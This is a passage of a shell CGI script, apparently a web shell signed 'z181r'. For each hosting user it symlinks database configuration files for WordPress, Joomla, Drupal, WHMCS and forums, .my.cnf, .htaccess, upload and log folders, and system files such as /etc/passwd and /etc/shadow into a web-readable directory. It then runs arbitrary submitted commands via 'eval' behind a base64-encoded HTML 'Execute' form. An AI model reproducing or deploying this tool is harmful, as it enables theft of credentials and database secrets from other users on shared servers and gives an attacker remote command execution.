eval "ln -s /home/$i/public_html/billings/configuration.php ../z181r-Sym/z181rConfig/Other/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../z181r-Sym/z181rConfig/Other/$i-whmcs2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../z181r-Sym/z181rConfig/Other/$i-whmcs3.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../z181r-Sym/z181rConfig/Other/$i-whmcs4.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../z181r-Sym/z181rConfig/Other/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../z181r-Sym/z181rConfig/Other/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../z181r-Sym/z181rConfig/Other/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../z181r-Sym/z181rConfig/Other/$i-supports.txt";
eval "ln -s /home/$i/public_html/vb/includes/config.php ../z181r-Sym/z181rConfig/Other/$i-vb.txt";
eval "ln -s /home/$i/public_html/includes/config.php ../z181r-Sym/z181rConfig/Other/$i-vb2.txt";
eval "ln -s /home/$i/public_html/config.php ../z181r-Sym/z181rConfig/Other/$i-2.txt";
eval "ln -s /home/$i/public_html/forum/includes/config.php ../z181r-Sym/z181rConfig/Other/$i-forum.txt";
eval "ln -s /home/$i/public_html/forums/includes/config.php ../z181r-Sym/z181rConfig/Other/$i-forums.txt";
eval "ln -s /home/$i/public_html/admin/conf.php ../z181r-Sym/z181rConfig/Other/$i-5.txt";
eval "ln -s /home/$i/public_html/admin/config.php ../z181r-Sym/z181rConfig/Other/$i-4.txt";
eval "ln -s /home/$i/public_html/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla.txt";
eval "ln -s /home/$i/public_html/joomla/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-joomla.txt";
eval "ln -s /home/$i/public_html/new/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-new.txt";
eval "ln -s /home/$i/public_html/old/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-old.txt";
eval "ln -s /home/$i/public_html/web/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-web.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-portal.txt";
eval "ln -s /home/$i/public_html/site/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-site.txt";
eval "ln -s /home/$i/public_html/test/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-test.txt";
eval "ln -s /home/$i/public_html/demo/configuration.php ../z181r-Sym/z181rConfig/Joomla/$i-joomla-demo.txt";
eval "ln -s /home/$i/public_html/sites/default/settings.php ../z181r-Sym/z181rConfig/Drupal/$i-drupal.txt";
eval "ln -s /home/$i/public_html/drupal/sites/default/settings.php ../z181r-Sym/z181rConfig/Drupal/$i-drupal2.txt";
eval "ln -s /home/$i/public_html/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress.txt";
eval "ln -s /home/$i/public_html/blog/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-blog.txt";
eval "ln -s /home/$i/public_html/new/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-new.txt";
eval "ln -s /home/$i/public_html/old/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-old.txt";
eval "ln -s /home/$i/public_html/blogs/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-blogs.txt";
eval "ln -s /home/$i/public_html/wp/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-wp.txt";
eval "ln -s /home/$i/public_html/beta/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-beta.txt";
eval "ln -s /home/$i/public_html/wordpress/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-wordpress.txt";
eval "ln -s /home/$i/public_html/demo/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-demo.txt";
eval "ln -s /home/$i/public_html/test/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-test.txt";
eval "ln -s /home/$i/public_html/site/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-site.txt";
eval "ln -s /home/$i/public_html/web/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-web.txt";
eval "ln -s /home/$i/public_html/portal/wp-config.php ../z181r-Sym/z181rConfig/WordPress/$i-wordpress-portal.txt";
eval "ln -s /home/$i/public_html/conf_global.php ../z181r-Sym/z181rConfig/Other/$i-6.txt";
eval "ln -s /home/$i/public_html/include/db.php ../z181r-Sym/z181rConfig/Other/$i-7.txt";
eval "ln -s /home/$i/public_html/connect.php ../z181r-Sym/z181rConfig/Other/$i-8.txt";
eval "ln -s /home/$i/public_html/mk_conf.php ../z181r-Sym/z181rConfig/Other/$i-9.txt";
eval "ln -s /home/$i/public_html/include/config.php ../z181r-Sym/z181rConfig/Other/$i-10.txt";
eval "ln -s /home/$i/public_html/appuser/functions.php ../z181r-Sym/z181rConfig/Other/$i-tr.txt";
eval "ln -s /home/$i/.contactemail ../z181r-Sym/z181rContactEmail/$i-contactemail.txt";
eval "ln -s /home/$i/public_html/.htaccess ../z181r-Sym/z181rHtaccess/$i-htaccess.txt";
eval "ln -s /home/$i/public_html/images/ ../z181r-Sym/z181rUpload/$i-images";
eval "ln -s /home/$i/public_html/wp-content/uploads/ ../z181r-Sym/z181rUpload/$i-uploads";
eval "ln -s /home/$i/public_html/tmp/ ../z181r-Sym/z181rUpload/$i-tmp";
eval "ln -s /home/$i/public_html/system/logs/ ../z181r-Sym/z181rUpload/$i-logs";
eval "ln -s /home/$i/public_html/system/storage/logs/ ../z181r-Sym/z181rUpload/$i-slogs";
eval "ln -s /var/log/domlogs/$i/ ../z181r-Sym/z181rData/z181rSDU/$i-SDU";
eval "ln -s /etc/passwd ../z181r-Sym/z181rData/passwd.txt";
eval "ln -s /etc/shadow ../z181r-Sym/z181rData/shadow.txt";
eval "ln -s /etc/named.conf ../z181r-Sym/z181rData/named.conf.txt";
eval "ln -s /home/$i/.my.cnf ../z181r-Sym/z181rData/cPanel/$i-cPanel.txt" ;
eval "ln -s /var/named/ ../z181r-Sym/z181rData/DomainDB" ;
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5rJyBocmVmPScuLi9Gb3gtU3ltJz5DbGljayBoZXJlPC9hPiA8L2Rpdj4=' | base64 -d
fi
if [ -n "$cc"  ] ; then
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
cd $d 
eval $cc
echo $?
echo '</xmp></div></pre></td></tr></table><br><br>'
fi
echo 'PGJyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCTxkaXYgYWxpZ249ImNlbnRlciI+PHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEyMCIgaWQ9InRhYmxlMSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIj48dHI+PHRkIHdpZHRoPSI3MTIiPiBFeGVjdXRlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2MiIHNpemU9IjEwMCIgIC8+PC90ZD48dGQ+PC90ZD48L3RyPjx0cj48dGQgd2lkdGg9IjcxMiI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImQiIHNpemU9IjEwMCIgdmFsdWU9Ig==' | base64 -d
pwd  
echo 'Ii8+CjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbjEiIHZhbHVlPSJTZW5kIiAvPjwvdGQ+PC90cj48L3RhYmxlPjwvZGl2PjwvZm9ybT48YnI+PGJyPgo8YnI+PGJyPjxocj48Y2VudGVyPg==' | base64 -d

echo '<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<center><font style="color:white;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">Coder </font><font style="color:black;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">:</font><font style="color:red;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland"> z181r</font></center>
<br>
</BODY>
</HTML>'
